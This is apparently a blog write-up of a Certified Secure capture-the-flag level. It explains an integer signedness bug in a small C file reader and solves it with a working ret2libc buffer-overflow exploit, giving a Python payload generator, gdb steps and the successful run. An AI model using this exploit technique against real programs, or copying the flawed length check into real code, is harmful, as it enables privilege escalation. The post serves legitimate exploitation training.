---
title:  "[CTF] Binary Master Lieutenant - 2"
---

![Logo](/assets/images/belts-purple.png)


In this post we'll continue with the second level from the [Lieutenant](https://www.certifiedsecure.com/certification/view/37) set of challenges from **Certified Secure Binary Mastery**.
Another buffer overflow, similar mitigatiopn techniques as we've seen in the previous level (non-executable stack), 
but this time we have another flaw, a little more subtle: _integer signedness error_.

To review the previous levels, check the links below:
* [Binary Master: Ensign - Level 1]({{ site.baseurl }}{% post_url 2016-01-07-binary-master-ensign-1 %})
* [Binary Master: Ensign - Level 2]({{ site.baseurl }}{% post_url 2016-01-14-binary-master-ensign-2 %})
* [Binary Master: Ensign - Level 3]({{ site.baseurl }}{% post_url 2016-01-21-binary-master-ensign-3 %})
* [Binary Master: Ensign - Level 4]({{ site.baseurl }}{% post_url 2016-01-28-binary-master-ensign-4 %})
* [Binary Master: Ensign - Level 5]({{ site.baseurl }}{% post_url 2016-02-09-binary-master-ensign-5 %})
* [Binary Master: Lieutenant - Level 1]({{ site.baseurl }}{% post_url 2016-02-16-binary-master-lieutenant-1 %})

## 0 - Discovery
Let's connect to the server and check the binary we're dealing with:
```
$ ssh level2@hacking.certifiedsecure.com -p 8267
level2@hacking.certifiedsecure.com's password: 
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 3.13.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

0 packages can be updated.
0 updates are security updates.

New release '16.04.2 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

   ___  _                    __  ___          __              
  / _ )(_)___ ___ _______ __/  |/  /___ ____ / /____ ______ __
 / _  / // _ | _ `/ __/ // / /|_/ // _ `(_-</ __/ -_) __/ // /
/____/_//_//_|_,_/_/  \_, /_/  /_/ \_,_/___/\__/\__/_/  \_, / 
                     /___/                             /___/  

             ___           __                   __ 
            / (_)___ __ __/ /____ ___ ___ ____ / /_
           / / // -_) // / __/ -_) _ | _ `/ _ | __/
          /_/_/ \__/\_,_/\__/\__/_//_|_,_/_//_|__/ 
                                                   

```

Let's see what mitigation techniques we have now using [checksec.sh](http://www.trapkit.de/tools/checksec.html), downloaded and run locally:
```bash
$ checksec.sh --file level2
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   level2
```

There is no stack canary and the stack is **not** executable. As we've seen in the previous level, [ASLR is disabled](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization) system-wise for this set of challenges.

## 1 - Vulnerability

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

void head(int len, char *filename) {
	char buf[256];
	
	if (len > 255) {                         [1]
		printf("You are insane!\n");
		return;
	}

	int fp = open(filename, O_RDONLY);

	if (fp == 0) {                           [2]
		printf("Computer says no\n");
		return;
	}

	buf[read(fp, buf, len)] = 0;	         [3]
	close(fp);

	printf("%s\n", buf);
}

int main(int argc, char **argv) {
	if (argc < 2) {
		printf("Usage: %s <size>\n", argv[0]);
		return -1;
	}

	head(atoi(argv[1]), argv[2]);
	
	return 0;
}
```

First let's understand what is the purpose of this program and how it works. In this case it's pretty straight forward:
* Its first parameter represents a number of lines to be read from the filename specified in the second command line parameter.
* A first sanity check is implemented at **[1]**: if the length is greater than 255 bytes, the program will terminate.
* A second check at **[2]** after the _open_ call probably intends to terminate the program if file cannot be opened successfully.
* Finally,the _read_ call at **[3]** copies maximum _len_ characters into the buffer _buf_, whose size is 256 bytes, thus avoiding the overflow.

Now let's see if we can break it:
* Let's notice that the check at **[2]** is actually not effective because, according to its [man page](http://man7.org/linux/man-pages/man2/open.2.html), _open_ will return -1 in case of error, not 0. This means that the program will have unpredictable output for non-existent files.
* The check at **[1]** poses, however, a more serious risk: as we can see from the definition of the function, _len_ is actually a signed integer. But [read](https://linux.die.net/man/3/read) expects instead a **size_t** parameter. This means that passing any negative value will successfulyl bypass the check, overflow the buffer and everything beyond, including the return address from function _head_.

Although one might expect that a GCC compiler error would be generated in situations like this, it is not actually the case. Moreover, even eanbling _all warnings_ and _extra warnings_ doesn't produce any relevant message. These flags are actually misleading, since it is not possible (nor desirable!) to show _ALL_ compilation errors supported by GCC. See [here](https://stackoverflow.com/questions/11714827/how-to-turn-on-literally-all-of-gccs-warnings) why. That's why I was saying it is slighly more difficult to spot this class of vulnerabilities in practice. 

```bash
$ gcc -m32 -fstack-protector level2.c -o level2       
$ gcc -Wall -Wextra -m32 -fstack-protector level2.c -o level2
$ 
```

The only way to get a warning for this kind of behaviour is to manually enable implicit sign conversions erros, using the **-Wsign-conversion** flag.

```
-Wsign-conversion
    Warn for implicit conversions that may change the sign of an integer value, like assigning a signed integer expression to an unsigned integer variable. An explicit cast silences the warning. In C, this option is enabled also by -Wconversion. 
```

```bash
$ gcc -Wsign-conversion -m32 -fstack-protector level2.c -o level2
level2.c: In function ‘head’:
level2.c:24:20: warning: conversion to ‘size_t {aka unsigned int}’ from ‘int’ may change the sign of the result [-Wsign-conversion]
  buf[read(fp, buf, len)] = 0; 
                    ^
```		    

## 2 - Exploit 

Given the previous finding, the exploitation is simple and very similar with [level 1](https://livz.github.io/2016/02/16/binary-master-lieutenant-1.html). First we'll see what we need to control the EIP and then we'll introduce a payload as well.

### Controlling the execution flow
Although we know that **buf** is 256 bytes in size, we need to see the stack layout of the function **head** in order to understand exactly how many bytes we need to overwrite to get to the saved return address on the stack.

![head stack](/assets/images/bm7-0.png)

So we need 256 + 12 + 4 bytes of padding in the buffer before we'll reach the saved return address. Let's see first if we can reliably control the return address:

```bash
$ python -c 'print "A"*272 + "BBBB"' > input
$ gdb -q ./level2

gdb-peda$ run -1 input
```
We see below that the execution crashed at address **0x42424242** ("BBBB"). That's good. We can move on.

![Control EIP](/assets/images/bm7-1.png)

### Add ret2libc payload
In a very similar way with the previous level, we'll return from _head_ function to the _system_ function, and place its argument in an environment variable. All the unchanged details omitted for space. The format of our payload is:

```
| PADDING (272 bytes) | addr. of system() | addr of exit() | addr of arguments |
```

The python script below generates the payload according to this scheme:

```python
import struct                                                                                                      
from subprocess import call

system = 0xf7e65e70     # Address of system() function
exit = 0xf7e58f50       # Address of exit() function
egg = 0xffffd928-6      # Address of environment variable (/home/level2/victory)

payload = "A" * (256 + 12 + 4) + struct.pack("<I", system) + struct.pack("<I", exit) + struct.pack("<I", egg)

open("/tmp/input", "wb").write(payload)
```

## 3 - Profit

```
$ python /tmp/gen.py > /tmp/input
$ /levels/level2 -1 /tmp/input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp^�P��"��
   ___  _                      __  ___         __  
  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
 / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
                     /___/                              /___/  
                ___           __                   __   
               / (_)___ __ __/ /____ ___ ___ ____ / /_  
              / / // -_) // / __/ -_) _ | _ `/ _ | __/  
             /_/_/ \__/\_,_/\__/\__/_//_|_,_/_//_|__/   

Subject: Victory!

Congrats, you have solved level2. To update your score,
send an e-mail to unlock@certifiedsecure.com and include:
   * your CS-ID
   * which level you solved (level2 @ binary mastery lieutenant)
   * the exploit 
   
You can now start with level3. If you want, you can log in
as level3 with password     [REDACTED]
```

That's it for now. It the [next level]({{ site.baseurl }}{% post_url 2016-03-02-binary-master-lieutenant-3 %}) we'll look at a new calss of issues - _command injection vulnerabilities_.
